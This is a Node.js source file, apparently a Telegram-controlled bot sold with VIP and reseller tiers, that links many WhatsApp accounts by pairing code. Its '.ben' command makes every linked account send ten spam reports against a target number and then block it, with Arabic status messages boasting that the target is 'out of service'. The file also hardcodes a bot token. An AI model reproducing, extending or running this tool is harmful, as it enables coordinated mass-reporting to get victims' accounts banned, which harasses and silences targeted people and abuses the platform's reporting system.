/**
 * 👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 - 𝑹𝑬𝑷𝑬𝑨𝑻𝑬𝑹 𝑬𝑫𝑰𝑻𝑰𝑶𝑵 👑
 * نظام المعالجة المتكررة (10 بلاغات لكل حساب بالتسلسل)
 * تم الإصلاح: منع الحظر المبكر + تأكيد وصول كل بلاغ على حدة.
 */

const { Telegraf, Markup } = require('telegraf');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    jidNormalizedUser,
    delay
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const express = require('express');

// ==========================================
// 🔱 محرك التنسيق والعدادات الحقيقية 🔱
// ==========================================
function formatLuxuriousMessage(title, content) {
    const frameTop    = `╔══════════ ≪ 🔱 𝑽𝑰𝑷 𝟏𝟎𝟎𝟎 🔱 ≫ ══════════╗`;
    const frameBottom = `╚══════════ ≪ 🔱 𝑽𝑰𝑷 𝟏𝟎𝟎𝟎 🔱 ≫ ══════════╝`;
    const separator   = `╟────────────────────────────────────────╢`;
    let lines = content.split('\n').map(line => `   ◈ ${line}`).join('\n');
    return `${frameTop}\n   ✨ *${title}*\n${separator}\n\n${lines}\n\n${separator}\n   👑 _𝑻𝑨𝑹𝒁𝑨𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 𝑺𝒀𝑺𝑻𝑬𝑴_\n${frameBottom}`;
}

function createProgressBar(current, total) {
    const size = 12;
    const progress = Math.min(Math.round((current / total) * size), size);
    const emptyProgress = size - progress;
    const bar = "▓".repeat(progress) + "░".repeat(emptyProgress);
    const percent = Math.min(Math.round((current / total) * 100), 100);
    return `📊 ${bar} ${percent}%`;
}

// ==========================================
// 🌐 خادم الويب وقاعدة البيانات
// ==========================================
const app = express();
app.get('/', (req, res) => res.send('👑 TARZAN SYSTEM ACTIVE 👑'));
app.listen(process.env.PORT || 3000);

const TG_TOKEN = '8831436238:AAF9M5hGwNbQwfoLKOr_XYS2Qij6WOA7Krw'; 
const OWNER_ID = '8794826397'; 
const DB_FILE = './tarzan_master_db.json';

let db = { config: { mode: 'FREE' }, users: {}, sessions: {} };
if (fs.existsSync(DB_FILE)) {
    try { db = { ...db, ...JSON.parse(fs.readFileSync(DB_FILE)) }; } catch (e) {}
}
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));

const activeSockets = {}; 
const userStates = {}; 

// ==========================================
// ⚔️ محرك الواتساب (التكرار الصارم 10x)
// ==========================================

async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = null) {
    const sessionDir = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ["Windows", "Edge", "110.0.1587.41"], // محاكاة ميكروسوفت ايدج لطلب الكود
        syncFullHistory: false
    });

    activeSockets[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // طلب كود الربط
    if (phoneNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''));
                if (tgContext) {
                    await tgContext.replyWithHTML(`🔱 كود الربط (Edge): <code>${code}</code>`);
                }
            } catch (e) {}
        }, 3000);
    }

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || !msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();

        if (body.startsWith('.ben ')) {
            const target = body.split(' ')[1];
            if (!target) return;
            const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            
            const sessionsKeys = Object.keys(activeSockets);
            const reportsPerAcc = 10;
            const totalRequired = sessionsKeys.length * reportsPerAcc;

            const startMsg = await sock.sendMessage(from, { 
                text: formatLuxuriousMessage('بـدء الإبـادة الـتـكـرارية 💀', 
                `الـهدف: ${target}\nالـجيش: ${sessionsKeys.length} حساب\nالـخطة: 10 بلاغات لكل حساب\nالـحالة: جاري التنفيذ بالتسلسل...\n${createProgressBar(0, 100)}`) 
            }, { quoted: msg });

            (async () => {
                let totalRealHits = 0;

                // الحلقة الكبيرة: تمر على كل حساب متصل
                for (const sId of sessionsKeys) {
                    const currentSock = activeSockets[sId];
                    if (!currentSock) continue;

                    // الحلقة الصغيرة: ترسل 10 بلاغات من هذا الحساب تحديداً
                    for (let i = 1; i <= reportsPerAcc; i++) {
                        try {
                            // إرسال بلاغ SPAM وانتظار النتيجة من السيرفر
                            await currentSock.reportSpam(targetJid);
                            
                            totalRealHits++;
                            
                            // تحديث الرسالة فوراً لإظهار التقدم الحقيقي
                            await sock.sendMessage(from, { 
                                edit: startMsg.key, 
                                text: formatLuxuriousMessage('جـاري الـقـصف الـمـسـتمر ⚔️', 
                                `الـتـقدم: ${createProgressBar(totalRealHits, totalRequired)}\nالـبلاغات الـمؤكدة: ${totalRealHits}\nالـحساب الـحالي: ${sId.substring(0,8)}...`) 
                            });

                            // فاصل زمني قصير بين بلاغات نفس الحساب لضمان القبول
                            await delay(1000);
                        } catch (err) {
                            console.error(`Error in ${sId}:`, err.message);
                        }
                    }
                    
                    // بعد انتهاء الـ 10 بلاغات من هذا الحساب، نقوم بعمل بلوك نهائي من هذا الحساب
                    try {
                        await currentSock.updateBlockStatus(targetJid, 'block');
                    } catch (e) {}
                }

                // النتيجة النهائية بعد انتهاء كافة الحسابات من كافة البلاغات
                await sock.sendMessage(from, { 
                    edit: startMsg.key, 
                    text: formatLuxuriousMessage('تـم سـحق الـهـدف بـنجاح ✅', 
                    `إجـمالي الـبلاغات: ${totalRealHits}\nالأنـظمة الـمشاركة: ${sessionsKeys.length}\nالـنتيجة: تم إرسال 10 بلاغات من كل رقم.\n\n*الـهدف خـارج الـخـدمة الآن* 👑😈`) 
                });
            })();
        }
    });

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                setTimeout(() => startWhatsAppSession(sessionId), 5000);
            }
        }
    });
}

// ==========================================
// 📱 لوحة تحكم تلجرام (الميزات الأصلية)
// ==========================================
const bot = new Telegraf(TG_TOKEN);

bot.start((ctx) => {
    const uid = ctx.from.id.toString();
    const isOwner = uid === OWNER_ID;
    const user = db.users[uid];
    const role = isOwner ? 'OWNER' : (user ? user.role : 'GUEST');

    let buttons = [
        [Markup.button.callback('🔗 ربط VIP 1000', 'action_pair')],
        [Markup.button.callback('📊 حالة السيرفر', 'server_status')]
    ];
    
    if (role === 'OWNER' || role === 'RESELLER') buttons.push([Markup.button.callback('🎫 تفعيل VIP', 'action_add_vip')]);
    
    ctx.replyWithHTML(`🔱 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶 VIP 1000</b> 🔱\nالرتبة: ${role}\nالجيش: ${Object.keys(activeSockets).length}`, Markup.inlineKeyboard(buttons));
});

bot.action('action_pair', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAIT_PHONE' };
    ctx.reply("📱 أرسل رقم الهاتف (مثال: 96650...):");
});

bot.on('text', async (ctx) => {
    const uid = ctx.from.id;
    const state = userStates[uid];
    if (!state) return;

    if (state.action === 'WAIT_PHONE') {
        const phone = ctx.message.text.replace(/[^0-9]/g, '');
        const sId = `VIP_${Date.now()}`;
        await startWhatsAppSession(sId, phone, ctx);
        delete userStates[uid];
    } else if (state.action === 'WAIT_USER_ID') {
        db.users[ctx.message.text.trim()] = { role: 'USER' };
        saveDB(); ctx.reply("✅ تم التفعيل."); delete userStates[uid];
    }
});

const init = async () => {
    const sDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sDir)) fs.mkdirSync(sDir);
    bot.launch();
    console.log("🔥 REPEATER SYSTEM ONLINE");
};
init();
